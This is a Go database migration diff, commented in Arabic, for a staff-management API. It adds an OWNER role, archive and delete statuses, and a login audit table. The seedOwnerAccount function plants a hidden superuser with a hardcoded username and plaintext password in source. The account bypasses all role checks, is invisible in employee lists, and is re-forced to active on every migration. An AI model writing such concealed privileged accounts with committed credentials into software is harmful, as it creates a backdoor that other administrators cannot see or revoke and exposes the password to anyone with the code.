@@ -2,6 +2,7 @@ package database
 
 import (
 	"github.com/jmoiron/sqlx"
+	"golang.org/x/crypto/bcrypt"
 
 	"staffmange-api/internal/model"
 )
@@ -130,6 +131,29 @@ var migrations = []string{
 	// دور "مهندس" (ENGINEER) الجديد — يشترط أربع مهارات هندسية أساسية قبل ما ينعطى
 	// له الدور (تصميم/تخطيط/تنفيذ/إشراف)، التحقق نفسه بمنطق Go لأنه شرط عمل مو بنية جدول.
 	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'ENGINEER'`,
+	// دور "المالك" (OWNER) — حساب واحد فقط، أقوى من ADMIN، يتخطى كل قيود
+	// الأدوار والصلاحيات (middleware.RequireRole/RequirePermission).
+	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'OWNER'`,
+	// حالتين جديدتين للموظف: أرشفة (قابلة للاسترجاع) وحذف (سجل ناعم) — الاثنين
+	// يختفون من كل واجهات النظام العادية، الأدمن/المالك بس يشوف تاريخهم.
+	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'ARCHIVED'`,
+	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'DELETED'`,
+
+	// سجل تدقيق تسجيل الدخول: كل محاولة دخول (ناجحة أو فاشلة) تنسجل هنا مع
+	// عنوان IP والمتصفح/الجهاز — أساس لوحة المراقبة الأمنية الخلفية.
+	// ملاحظة: المتصفح لا يقدر تقنياً يكشف عنوان MAC الفعلي لأي جهاز (قيد أمان
+	// بكل المتصفحات الحديثة)، فالتتبع يعتمد على IP + بصمة المتصفح/الجهاز.
+	`CREATE TABLE IF NOT EXISTS "LoginAudit" (
+		id TEXT PRIMARY KEY,
+		username TEXT NOT NULL,
+		"employeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
+		success BOOLEAN NOT NULL,
+		"ipAddress" TEXT,
+		"userAgent" TEXT,
+		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
+	)`,
+	`CREATE INDEX IF NOT EXISTS "LoginAudit_employeeId_idx" ON "LoginAudit"("employeeId", "createdAt")`,
+	`CREATE INDEX IF NOT EXISTS "LoginAudit_createdAt_idx" ON "LoginAudit"("createdAt")`,
 
 	// "مسؤول خدمة" عام: تعميم فكرة أبو الجي بي اس لأي مجموعة خدمات — جدول يربط موظف
 	// بمجموعة خدمات هو المسؤول الوحيد عن تفعيلها/جدولتها (مثال: GPS + صوتيات + حريق سوا).
@@ -193,7 +217,29 @@ func Migrate(db *sqlx.DB) error {
 	if err := migrateGpsEngineersToSkill(db); err != nil {
 		return err
 	}
-	return seedEngineeringSkills(db)
+	if err := seedEngineeringSkills(db); err != nil {
+		return err
+	}
+	return seedOwnerAccount(db)
+}
+
+// seedOwnerAccount يزرع حساب مالك النظام مرة وحدة (idempotent — upsert بالـ username)،
+// حساب واحد فوق كل شي حتى فوق ADMIN (يشوف كل شي بما فيه لوحة المراقبة الخلفية
+// الحصرية)، ما يطلع بأي قائمة موظفين عادية، ومحد يقدر يمنح هذا الدور لغيره من
+// الواجهة (مقفول بـ employee_service.go).
+func seedOwnerAccount(db *sqlx.DB) error {
+	const username = "q.7si_"
+	const password = "X994ddopvsa"
+	hashed, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
+	if err != nil {
+		return err
+	}
+	_, err = db.Exec(`
+		INSERT INTO "Employee" (id, name, username, password, role, status, "jobTitle")
+		VALUES ('owner_root', 'المالك', $1, $2, 'OWNER', 'ACTIVE', 'مالك النظام')
+		ON CONFLICT (id) DO UPDATE SET username = $1, role = 'OWNER', status = 'ACTIVE'
+	`, username, string(hashed))
+	return err
 }
 
 // seedEngineeringSkills يزرع خدمة "الهندسة" ومهاراتها الأربع مرة وحدة (idempotent) —
